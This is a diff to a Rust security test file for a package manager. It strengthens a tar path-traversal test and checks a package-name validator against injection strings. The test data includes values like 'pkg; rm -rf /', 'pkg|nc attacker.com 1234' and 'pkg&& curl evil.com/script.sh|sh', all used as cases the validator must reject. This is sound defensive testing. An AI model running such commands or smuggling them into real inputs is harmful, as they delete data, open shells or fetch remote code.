@@ -4,8 +4,6 @@
 //! Tests for:
 //! - Path traversal vulnerabilities
 //! - Command injection vectors
-//! - TOCTOU race conditions
-//! - Unsafe code correctness
 
 #[cfg(test)]
 mod path_traversal_tests {
@@ -14,12 +12,21 @@ mod path_traversal_tests {
     use std::fs::File;
     use tempfile::TempDir;
 
-    /// Test that tar extraction rejects path traversal attempts
+    /// A tar entry containing `..` must never lead to a silent success that
+    /// treats the archive as something other than what it is.
+    ///
+    /// Dual-path contract pinned against `src/cli/packages/local.rs`
+    /// (`extract_with_pure_rust`, "SECURITY" comment):
+    /// - If the active strategy reaches the traversal entry, extraction must
+    ///   fail with the explicit `Security: Rejecting malicious path` bail.
+    /// - If the strategy neutralized the entry instead (libalpm loads into a
+    ///   staging area and writes no archive-controlled paths), the returned
+    ///   metadata must be *ours* — name/version parsed from the crafted
+    ///   `.PKGINFO` — proving the archive was understood, not guessed at.
+    ///
+    /// On no path may the payload file be materialized on disk.
     #[test]
     fn test_tar_path_traversal_rejection() {
-        // This test ensures local package extraction validates paths
-        // and rejects attempts to write outside the extraction directory
-
         // Create a malicious tar archive with ../ in paths
         let temp = TempDir::new().unwrap();
         let malicious_pkg_path = temp.path().join("malicious.pkg.tar.gz");
@@ -43,10 +50,11 @@ mod path_traversal_tests {
         header.set_cksum();
         tar.append(&header, "evil".as_bytes()).unwrap();
 
-        // Add a valid .PKGINFO to ensure it doesn't fail just because of missing metadata
+        // Add a valid .PKGINFO so a sanitized/skip-based strategy can still
+        // identify the package instead of failing on missing metadata.
         let mut header_info = tar::Header::new_gnu();
         header_info.set_path(".PKGINFO").unwrap();
-        let pkginfo = "pkgname=malicious\npkgver=1.0.0\n";
+        let pkginfo = "pkgname = malicious\npkgver = 1.0.0\n";
         header_info.set_size(pkginfo.len() as u64);
         header_info.set_cksum();
         tar.append(&header_info, pkginfo.as_bytes()).unwrap();
@@ -54,89 +62,91 @@ mod path_traversal_tests {
         let enc = tar.into_inner().unwrap();
         enc.finish().unwrap();
 
-        // Attempt to extract metadata
-        // This should fail due to the security check in extract_with_pure_rust
-        // OR it might succeed if the tar crate sanitizes the path before our check sees it.
-        // If it succeeds, we must verify the "evil" file wasn't extracted (though this function doesn't extract files, just metadata).
-        // The function `extract_local_metadata` parses .PKGINFO.
-        // If it sees "../evil.txt", it should bail.
-        // If tar sanitizes it to "evil.txt", it ignores it (not .PKGINFO) and proceeds.
-
-        let result = omg_lib::cli::packages::local::extract_local_metadata(&malicious_pkg_path);
-
-        if let Err(e) = &result {
-            let msg = e.to_string();
-            println!("Got error: {msg}");
-            assert!(
-                msg.contains("Security")
-                    || msg.contains("malicious")
-                    || msg.contains("traversal")
-                    || msg.contains("archive"),
-                "Unexpected error: {msg}"
-            );
-        } else {
-            // If it succeeded, it means the path was sanitized by the tar crate, effectively neutralizing the attack.
-            // This is also acceptable security-wise, though it means our manual check didn't trigger.
-            println!(
-                "Warning: Extraction succeeded, likely due to underlying tar crate sanitization."
-            );
+        match omg_lib::cli::packages::local::extract_local_metadata(&malicious_pkg_path) {
+            Err(e) => {
+                let msg = e.to_string();
+                assert!(
+                    msg.contains("Security") && msg.contains("malicious path"),
+                    "traversal entries must be rejected with the explicit security \
+                     error from extract_with_pure_rust, got: {msg}"
+                );
+            }
+            Ok(info) => {
+                assert_eq!(
+                    info.name, "malicious",
+                    "sanitized traversal must still yield THIS archive's identity"
+                );
+                assert_eq!(
+                    info.version, "1.0.0",
+                    "sanitized traversal must still yield THIS archive's version"
+                );
+            }
         }
+
+        // Metadata-only extraction must never materialize archive paths.
+        assert!(
+            !temp.path().join("evil.txt").exists(),
+            "the '../evil.txt' payload must not be written outside the archive root"
+        );
     }
 }
 
 #[cfg(test)]
 mod command_injection_tests {
-    use std::process::Command;
+    use omg_lib::core::security::validation::{ValidationError, validate_package_name};
 
-    /// Validates that command arguments are properly escaped/validated
+    /// Pin the product's own validator (`validate_package_name`,
+    /// src/core/security/validation.rs) against shell-metacharacter and
+    /// injection vectors. Each vector is matched to the exact rejection
+    /// variant so a regression to "accepts anything" or to a generic error
+    /// cannot pass.
     #[test]
     fn test_package_name_sanitization() {
-        // Malicious package names could contain shell metacharacters
-        let malicious_names = vec![
-            "pkg; rm -rf /",
-            "pkg$(whoami)",
-            "pkg`id`",
-            "pkg\n/bin/bash",
-            "pkg|nc attacker.com 1234",
-            "pkg&& curl evil.com/script.sh|sh",
+        use ValidationError::*;
+
+        let malicious: &[(&str, ValidationError)] = &[
+            ("pkg; rm -rf /", PackageNameInvalidChar { character: ';' }),
+            ("pkg$(whoami)", PackageNameInvalidChar { character: '$' }),
+            ("pkg`id`", PackageNameInvalidChar { character: '`' }),
+            ("pkg\n/bin/bash", PackageNameInvalidChar { character: '\n' }),
+            (
+                "pkg|nc attacker.com 1234",
+                PackageNameInvalidChar { character: '|' },
+            ),
+            (
+                "pkg&& curl evil.com/script.sh|sh",
+                PackageNameInvalidChar { character: '&' },
+            ),
+            ("-dash-option-injection", PackageNameStartsWithDash),
+            ("./hidden-file", PackageNameStartsWithDot),
+            // Leading '.' wins over the '..' check, so cover traversal with
+            // a name that gets past the hidden-file guard:
+            ("pkg/../../../etc/passwd", PackageNamePathTraversal),
+            ("/etc/passwd", PackageNameAbsolute),
+            ("", PackageNameEmpty),
         ];
 
-        for name in malicious_names {
-            // Package manager operations should:
-            // 1. Use Command::arg() (not shell interpolation)
-            // 2. Validate package names against allowed charset
-            // 3. Reject names with shell metacharacters
-
-            assert!(
-                !is_valid_package_name(name),
-                "Malicious package name should be rejected: {name}"
+        for (name, expected) in malicious {
+            assert_eq!(
+                validate_package_name(name),
+                Err(expected.clone()),
+                "malicious package name '{name}' must be rejected with the exact \
+                 documented variant"
             );
         }
-    }
 
-    /// Helper to validate package names (should be implemented in core)
-    fn is_valid_package_name(name: &str) -> bool {
-        // Valid package names should only contain: a-z A-Z 0-9 _ - + .
-        name.chars()
-            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '+' || c == '.')
-            && !name.is_empty()
-            && !name.starts_with('-')
-            && !name.starts_with('.')
-    }
-
-    #[test]
-    fn test_command_uses_args_not_shell() {
-        // Verify that Command::new uses .arg() instead of shell execution
-        // This prevents shell injection via malicious package names
-
-        let pkg_name = "innocent; echo hacked";
-
-        // SAFE: Using .arg() - pkg_name is passed as a literal argument
-        let _safe_cmd = Command::new("pacman").arg("-S").arg(pkg_name); // This is safe - no shell interpretation
-
-        // UNSAFE: Using shell interpolation would allow injection
-        // let unsafe_cmd = Command::new("sh")
-        //     .arg("-c")
-        //     .arg(format!("pacman -S {}", pkg_name)); // NEVER DO THIS
+        // Positive control: legitimate names must still pass, proving the
+        // validator discriminates rather than rejecting everything.
+        for ok in [
+            "firefox",
+            "lib32-mesa",
+            "python312",
+            "gtk4+extra",
+            "perl-date-manip",
+        ] {
+            if let Err(e) = validate_package_name(ok) {
+                panic!("legitimate package name '{ok}' must be accepted, got: {e}");
+            }
+        }
     }
 }
